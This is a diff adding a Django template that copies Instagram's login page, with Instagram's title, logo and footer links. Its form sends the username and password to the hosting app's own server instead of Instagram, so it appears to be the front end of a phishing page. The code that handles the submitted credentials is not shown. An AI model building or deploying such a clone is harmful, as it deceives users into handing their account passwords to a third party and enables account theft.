@@ -1,0 +1,71 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram ● Login</title>
+    <link rel="icon" type="image/x-icon" href="{% static 'Instagram_icon,png-photoaidcom-cropped.png' %}">
+    <link rel="stylesheet" href="{% static 'main.css' %}">
+</head>
+
+
+<body id="body">
+
+<div class="container">
+    <div class="box" id="body">
+        <a href="https://instagram.com/"><div class="heading"><img src="{% static 'logo2.png' %}" alt=""></div></a>
+        <form class="login-form" method="POST">
+            <div class="field">
+                {% csrf_token %}
+                {{form.username}}
+                <label for="username">Phone number, username, or email</label>
+            </div>
+            <div class="field">
+                {% csrf_token %}
+                {{form.password}}
+                <label for="password">Password</label>
+            </div>
+            <button type="submit" class="login-button" title="login">Log In</button>
+            <div class="separator">
+                <div class="line"></div>
+                <p>OR</p>
+                <div class="line"></div>
+            </div>
+            <div class="other">
+                <button  class="fb-login-btn" type="button">
+                    <i class="fa fa-facebook-official fb-icon"></i>
+                    <span class="">Log in with Facebook</span>
+                </button>
+                <a class="forgot-password" href="#">Forgot password?</a>
+            </div>
+        </form>
+    </div>
+    <div class="box">
+        <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+    </div>
+
+    <div class="link-part">
+        <ul>
+            <li><a href="https://about.instagram.com/about-us">ABOUT US</a></li>
+            <li><a href="https://help.instagram.com/">HELP</a></li>
+            <li><a href="https://about.instagram.com/blog">BLOG</a></li>
+            <li><a href="https://about.instagram.com/blog">PRESS</a></li>
+            <li><a href="https://developers.facebook.com/docs/instagram">API</a></li>
+            <li><a href="https://about.instagram.com/about-us/careers">JOBS</a></li>
+            <li><a href="https://privacycenter.instagram.com/policy">PRIVACY</a></li>
+        </ul>
+        <ul>
+            <li><a href="https://help.instagram.com/581066165581870/">TERMS</a></li>
+            <li><a href="https://www.instagram.com/directory/profiles/">TOP ACCOUNTS</a></li>
+            <li><a href="#">LANGUAGE</a></li>
+        </ul>
+    </div>
+
+</div>
+<!--<script src="./app.js"></script>-->
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+{% load sweetify %}
+{% sweetify %}
+</body>
+</html>
